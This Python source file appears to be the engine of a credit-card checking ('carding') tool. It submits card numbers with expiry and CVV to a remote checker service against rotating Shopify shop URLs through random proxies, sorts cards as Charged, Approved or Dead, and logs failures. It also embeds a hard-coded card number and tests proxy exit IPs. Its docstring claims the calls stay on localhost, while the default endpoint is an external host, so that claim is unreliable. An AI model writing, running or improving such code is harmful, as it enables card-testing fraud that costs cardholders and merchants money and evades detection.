"""
check_engine.py — Card checking engine + proxy utilities
All card check calls go to a local checker service (localhost:8099).
No external binaries or opaque modules are used.
"""
import asyncio
import aiohttp
import random
import os
import httpx

CHECKER_API  = os.environ.get("CHECKER_API_URL", "https://sh-fixed.eu.galaxycloud.app/")
_API_TIMEOUT = httpx.Timeout(connect=4.0, read=20.0, write=4.0, pool=5.0)

_http_client: httpx.AsyncClient | None = None
_client_lock = asyncio.Lock()

_session_bad_sites: set[str] = set()

def clear_session_bad_sites():
    global _session_bad_sites
    _session_bad_sites = set()

async def _get_client() -> httpx.AsyncClient:
    global _http_client
    async with _client_lock:
        if _http_client is None or _http_client.is_closed:
            _http_client = httpx.AsyncClient(
                timeout=_API_TIMEOUT,
                limits=httpx.Limits(
                    max_connections=1000,
                    max_keepalive_connections=200,
                    keepalive_expiry=30.0,
                ),
            )
    return _http_client

def _make_result(card, status, message, price='-', gateway='Shopify Payments',
                 receipt_url='', retryable=False, proxy='', time=None):
    return {
        'status':      status,
        'message':     message,
        'card':        card,
        'gateway':     gateway,
        'price':       price,
        'receipt_url': receipt_url,
        'retry':       retryable,
        'proxy':       proxy,
        'time':        time,
    }

_PROXY_ERR_SIGNALS = (
    'connection timed out', 'connection timeout', 'timed out',
    'proxy', 'eof occurred', 'remote end closed', 'failed to perform',
)

def _is_proxy_err(msg: str) -> bool:
    return any(s in msg.lower() for s in _PROXY_ERR_SIGNALS)

async def _call_checker_api(shop_url: str, card: str, proxy_raw: str) -> dict:
    """
    GET the checker API with query params: ?cc=&site=&proxy=
    Parses the JSON response:
      {"Charged":"True/False","Approved":"True/False","CC":"...","Gate":"...","Price":"...","Response":"...","Time":"..."}
    Raises on connection error or non-200 response.
    """
    c = await _get_client()
    r = await c.get(CHECKER_API, params={
        "cc":    card,
        "site":  shop_url,
        "proxy": proxy_raw,
    })
    r.raise_for_status()

    # Parse JSON response
    try:
        data = r.json()
    except Exception:
        data = {}

    charged  = str(data.get("Charged",  "false")).lower() == "true"
    approved = str(data.get("Approved", "false")).lower() == "true"
    response = str(data.get("Response", "")).strip()
    amount   = str(data.get("Price",    "-")).strip()
    time_val = str(data.get("Time",     "")).strip() or None
    gateway  = str(data.get("Gate",     "Shopify Payments")).strip()

    # ── Response text overrides Approved/Charged flags ───────────────────────
    # Some gateways (e.g. Shopify Payments) return Approved:True or
    # Charged:True while the Response field contains a hard-decline keyword.
    # The Response text is the ground truth — if it looks like a decline,
    # treat both flags as False so the card routes to Dead.
    _resp_up = response.upper()
    _DECLINE_SIGNALS = (
        "CARD_DECLINED", "DECLINED", "DO NOT HONOR", "DO NOT HONOUR",
        "INVALID", "EXPIRED", "BLOCKED", "STOLEN", "LOST",
    )
    if any(w in _resp_up for w in _DECLINE_SIGNALS):
        approved = False
        charged  = False

    # ── Charged (payment actually captured) ──────────────────────────────────
    if charged:
        return _make_result(
            card, 'Charged',
            message = response or "Payment captured",
            price   = amount,
            gateway = gateway,
            proxy   = proxy_raw,
            time    = time_val,
        )

    # ── Approved (auth only, no charge) ──────────────────────────────────────
    if approved:
        return _make_result(
            card, 'Approved',
            message = response or "Auth approved",
            price   = amount,
            gateway = gateway,
            proxy   = proxy_raw,
            time    = time_val,
        )

    # ── Declined / dead ───────────────────────────────────────────────────────
    resp_up = _resp_up  # already uppercased above
    if any(x in resp_up for x in ("DECLINED", "INSUFFICIENT", "STOLEN", "LOST", "INVALID", "EXPIRED", "BLOCKED")):
        return _make_result(
            card, 'Dead',
            message   = response,
            price     = amount,
            gateway   = gateway,
            retryable = False,
            time      = time_val,
        )

    # ── Everything else treated as a retryable error ──────────────────────────
    return _make_result(
        card, 'Dead',
        message   = response or "Checker error",
        gateway   = gateway,
        retryable = True,
        time      = time_val,
    )

async def test_site(site: str, proxy: str) -> dict:
    """
    Test whether a Shopify site is reachable and functioning.
    Returns {'site': ..., 'status': 'alive'|'dead'|'step_error', ...}
    """
    test_card = "5154623245618097|03|2032|156"
    try:
        result = await _call_checker_api(site, test_card, proxy)
        # Any non-ERROR response means the site is reachable
        if result['status'] in ('Charged', 'Approved', 'Dead'):
            return {'site': site, 'status': 'alive'}
        return {'site': site, 'status': 'dead', 'msg': result.get('message', '')[:100]}
    except httpx.ConnectError:
        return {'site': site, 'status': 'dead', 'msg': 'Checker API not reachable'}
    except Exception as e:
        msg = str(e)[:80]
        if 'step' in msg.lower():
            return {'site': site, 'status': 'step_error', 'msg': msg}
        return {'site': site, 'status': 'dead', 'msg': msg}

async def check_card_with_retry(card, sites, proxies, max_retries=2, start_proxy=None):
    """
    Check a card against the local checker API.
    Retries on proxy/site errors — stops on a definitive card result.
    """
    if not sites:
        return _make_result(card, 'Dead', 'No sites configured')
    # proxies may be [''] meaning "no proxy required" — that is valid
    if not proxies:
        return _make_result(card, 'Dead', 'No proxy configured')
    # effective proxies for random selection (empty string = no proxy)
    proxy_pool = proxies

    last_err     = 'Unknown error'
    MAX_TRIES    = 8
    failed_sites = set()

    for attempt in range(MAX_TRIES):
        available = [s for s in sites if s not in failed_sites] or list(sites)
        shop_url  = random.choice(available)
        proxy_raw = (start_proxy if attempt == 0 and start_proxy else random.choice(proxy_pool))

        try:
            result = await _call_checker_api(shop_url, card, proxy_raw)
        except Exception as e:
            last_err = str(e)
            failed_sites.add(shop_url)
            await asyncio.sleep(0.1)
            continue

        # Terminal results
        if result['status'] in ('Charged', 'Approved'):
            result['proxy'] = proxy_raw
            return result

        if result['status'] == 'Dead' and not result.get('retry'):
            return result

        # Retryable
        last_err = result.get('message', 'Retryable error')
        if _is_proxy_err(last_err):
            await asyncio.sleep(0.1)
            continue
        if 'step 0' in last_err.lower() or 'no product' in last_err.lower():
            failed_sites.add(shop_url)
        await asyncio.sleep(0.05)

    _log_error_card(card, last_err)
    return _make_result(card, 'Dead', last_err)

def clear_error_log():
    try:
        open("error.txt", 'w').close()
    except Exception:
        pass

def _log_error_card(card: str, reason: str):
    try:
        with open("error.txt", 'a', encoding='utf-8') as f:
            f.write(f"{card}  # {reason[:100]}\n")
    except Exception:
        pass

def _proxy_to_url(proxy: str) -> str:
    p = proxy.strip()
    if p.startswith(('http://', 'https://', 'socks4://', 'socks5://')):
        return p
    parts = p.split(':')
    if len(parts) == 2:
        return f'http://{p}'
    if len(parts) >= 4:
        host, port = parts[0], parts[1]
        rest       = ':'.join(parts[2:])
        mid        = rest.rfind(':')
        user_part  = rest[:mid]
        pw_part    = rest[mid+1:]
        return f'http://{user_part}:{pw_part}@{host}:{port}'
    return f'http://{p}'

async def test_proxy(proxy: str) -> dict:
    """
    Test a proxy by making an HTTP request through it.
    Returns {'proxy': ..., 'status': 'alive'|'dead'}
    """
    proxy_url = _proxy_to_url(proxy)
    test_urls = [
        'http://httpbin.org/ip',
        'http://api.ipify.org',
        'http://icanhazip.com',
    ]
    try:
        timeout = aiohttp.ClientTimeout(total=15)
        conn    = aiohttp.TCPConnector(ssl=False)
        async with aiohttp.ClientSession(timeout=timeout, connector=conn) as s:
            for url in test_urls:
                try:
                    async with s.get(url, proxy=proxy_url, allow_redirects=True) as r:
                        if r.status == 200:
                            return {'proxy': proxy, 'status': 'alive'}
                except Exception:
                    continue
        return {'proxy': proxy, 'status': 'dead'}
    except Exception:
        return {'proxy': proxy, 'status': 'dead'}

async def get_proxy_ip(proxy: str) -> str | None:
    """Get the exit IP of a proxy."""
    proxy_url = _proxy_to_url(proxy)
    if proxy_url.startswith('socks'):
        return None
    try:
        timeout = aiohttp.ClientTimeout(total=15)
        async with aiohttp.ClientSession(timeout=timeout) as s:
            async with s.get('https://api.ipify.org', proxy=proxy_url) as r:
                if r.status == 200:
                    return (await r.text()).strip()
    except Exception:
        pass
    return None